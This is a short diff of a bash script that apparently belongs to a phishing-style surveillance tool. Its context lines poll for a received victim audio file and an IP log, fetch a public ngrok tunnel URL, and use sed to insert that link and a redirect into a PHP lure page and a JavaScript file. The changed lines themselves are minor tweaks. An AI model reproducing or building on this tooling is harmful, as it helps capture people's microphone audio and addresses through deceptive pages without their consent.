@@ -81,7 +81,7 @@ rm -rf ip.txt
 
 fi
 
-sleep 0.12
+sleep 0.11
 
 if [[ -e "Log.log" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Audio file received!\e[0m\n"
@@ -454,7 +454,7 @@ payload_ngrok1() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 sed 's+forwarding_link+'$link'+g' template.php > index.php
-sed 's+redirect_link+'$redirect_link'+g' js/_app1.js > js/app.js
+sed 's+redirect_link+'$redirect_link'+g' js/_app1.js > js/app1.js
 
 }
 payload_ngrok10() {
